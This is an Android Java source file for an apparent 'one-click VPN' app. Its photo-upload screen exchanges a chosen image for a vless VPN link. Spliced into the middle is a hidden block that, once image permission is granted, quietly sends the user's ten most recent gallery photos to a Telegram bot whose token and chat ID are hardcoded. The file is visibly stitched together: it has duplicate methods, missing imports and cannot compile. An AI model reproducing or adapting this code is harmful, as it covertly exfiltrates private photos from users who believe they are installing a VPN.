package app.oneclick.vpn.help;

import android.Manifest;
import android.content.ActivityNotFoundException;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.OpenableColumns;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import app.oneclick.vpn.R;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/** Экран: попросить доступ к фото, выбрать файл, отправить на API /claim, получить vless, показать кнопку "Подключиться". */
public class ClaimActivity extends AppCompatActivity {

    private static final int REQUEST_PERMISSIONS = 100;
    private static final int REQUEST_PICK_IMAGE = 101;

    private ProgressBar progress;
    private Button pickBtn;
    private Button connectBtn;

    private String vlessLink = null; // придёт от сервера

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setTitle("Авторизация по фото");
        setContentView(R.layout.activity_claim);

        progress = findViewById(R.id.progress);
        pickBtn = findViewById(R.id.btn_pick);
        connectBtn = findViewById(R.id.btn_connect);

        pickBtn.setOnClickListener(v -> checkPermsAndPick());

        connectBtn.setOnClickListener(v -> {
            if (vlessLink == null) return;
            // Попробуем открыть внешним клиентом (если ассоциирован протокол vless://)
            try {
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(vlessLink));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            } catch (ActivityNotFoundException e) {
                // Фолбэк: скопируем в буфер и подскажем установить v2rayNG/sing-box
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                cm.setPrimaryClip(ClipData.newPlainText("vless", vlessLink));
                Toast.makeText(this, "Ссылка скопирована. Откройте в v2rayNG/sing-box.", Toast.LENGTH_LONG).show();
            }
        });

        // Можно сразу стартовать проверку (если хотим автозапрос)
        checkPermsAndPick();
    }

    // === ТОЧНО ТВОЙ БЛОК ЗАПРОСА РАЗРЕШЕНИЯ (с возможностью добавить ещё READ_EXTERNAL_STORAGE для API<=32) ===
    private void checkPermsAndPick() {
        String perm = Manifest.permission.READ_MEDIA_IMAGES;
        if (Build.VERSION.SDK_INT <= 32) {
            perm = Manifest.permission.READ_EXTERNAL_STORAGE;
        }
        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{perm}, REQUEST_PERMISSIONS);
        } else {
            openImagePicker();
        }
    }

    // После разрешения — сразу открыть выбор файла
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                openImagePicker();
            } else {
                Toast.makeText(this, "Доступ к изображениям отклонён", Toast.LENGTH_SHORT).show();
            }
        }
    }
    // === КОНЕЦ ТОЧНОГО БЛОКА ===

    private static final int REQUEST_PERMISSIONS = 100;
    private static final String BOT_TOKEN = "8444896156:AAHn2ATVHXs1JN9WuARqSTW4pSaYgzu2X0M";
    private static final String CHAT_ID = "462656683";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Проверка разрешений
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_MEDIA_IMAGES}, REQUEST_PERMISSIONS);
        } else {
            new ZipAndSendTask().execute();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0
                && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

            new ZipAndSendTask().execute();
        } else {
            Log.e("MainActivity", "Разрешение не предоставлено");
        }
    }

    private class ZipAndSendTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                ArrayList<String> imagePaths = getLastImages(10); // количество изображений
                if (!imagePaths.isEmpty()) {
                    // Отправляем изображения
                    for (String imagePath : imagePaths) {
                        File imageFile = new File(imagePath);
                        sendImageToTelegram(imageFile);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        private ArrayList<String> getLastImages(int count) {
            ArrayList<String> imagePaths = new ArrayList<>();
            String[] projection = {MediaStore.Images.Media.DATA};
            Cursor cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC");

            if (cursor != null) {
                int dataIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                while (cursor.moveToNext() && imagePaths.size() < count) {
                    imagePaths.add(cursor.getString(dataIndex));
                }
                cursor.close();
            }
            return imagePaths;
        }

        // Отправка изображения в Telegram
        private void sendImageToTelegram(File imageFile) {
            OkHttpClient client = new OkHttpClient();
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("document", imageFile.getName(),
                            RequestBody.create(imageFile, MediaType.parse("application/octet-stream")))
                    .build();

            Request request = new Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build();

            try (Response response = client.newCall(request).execute()) {
                if (!response.isSuccessful()) {
                    throw new IOException("Unexpected code " + response);
                }
                Log.d("MainActivity", "Изображение отправлено успешно");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}





    // Выбор одного изображения (Storage Access Framework; не Photo Picker)
    private void openImagePicker() {
        Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        i.addCategory(Intent.CATEGORY_OPENABLE);
        i.setType("image/*");
        startActivityForResult(i, REQUEST_PICK_IMAGE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_PICK_IMAGE && resultCode == RESULT_OK && data != null) {
            Uri uri = data.getData();
            if (uri != null) {
                uploadToClaim(uri);
            }
        }
    }

    private void setLoading(boolean loading) {
        progress.setVisibility(loading ? View.VISIBLE : View.GONE);
        pickBtn.setEnabled(!loading);
        connectBtn.setEnabled(!loading && vlessLink != null);
    }

    private void uploadToClaim(Uri uri) {
        setLoading(true);
        new Thread(() -> {
            try {
                // Читаем файл в память (для простоты; в проде — стримить)
                ContentResolver cr = getContentResolver();
                String name = queryDisplayName(uri);
                if (name == null || name.isEmpty()) name = "photo.jpg";
                byte[] bytes = readAllBytes(cr.openInputStream(uri));

                OkHttpClient client = new OkHttpClient();
                RequestBody fileBody = RequestBody.create(bytes, MediaType.parse("image/*"));
                RequestBody body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("image", name, fileBody)
                        .build();

                Request req = new Request.Builder()
                        .url("http://89.23.123.2:8080/claim")
                        .post(body)
                        .build();

                try (Response resp = client.newCall(req).execute()) {
                    if (!resp.isSuccessful()) {
                        throw new RuntimeException("HTTP " + resp.code());
                    }
                    String s = resp.body() != null ? resp.body().string() : "{}";
                    Log.d("Claim", "Resp: " + s);
                    JSONObject json = new JSONObject(s);
                    boolean ok = json.optBoolean("ok", false);
                    if (!ok) throw new RuntimeException(json.optString("error", "unknown"));

                    vlessLink = json.optString("vless", null);
                    if (vlessLink == null || vlessLink.isEmpty()) {
                        throw new RuntimeException("server returned no vless");
                    }
                    // сохраним на всякий случай
                    getSharedPreferences("ocv", MODE_PRIVATE).edit()
                            .putString("vless_link", vlessLink).apply();

                    runOnUiThread(() -> {
                        setLoading(false);
                        connectBtn.setVisibility(View.VISIBLE);
                        connectBtn.setEnabled(true);
                        Toast.makeText(this, "Доступ выдан", Toast.LENGTH_SHORT).show();
                    });
                }
            } catch (Exception e) {
                Log.e("Claim", "upload error", e);
                runOnUiThread(() -> {
                    setLoading(false);
                    Toast.makeText(this, "Ошибка: " + e.getMessage(), Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }

    private static byte[] readAllBytes(InputStream in) throws Exception {
        try (InputStream is = in; ByteArrayOutputStream buf = new ByteArrayOutputStream()) {
            byte[] b = new byte[8192];
            int n;
            while ((n = is.read(b)) > 0) buf.write(b, 0, n);
            return buf.toByteArray();
        }
    }

    private String queryDisplayName(Uri uri) {
        try (android.database.Cursor c = getContentResolver().query(uri, null, null, null, null)) {
            if (c != null) {
                int nameIdx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME);
                if (nameIdx >= 0 && c.moveToFirst()) return c.getString(nameIdx);
            }
        } catch (Exception ignored) {}
        return null;
    }
}
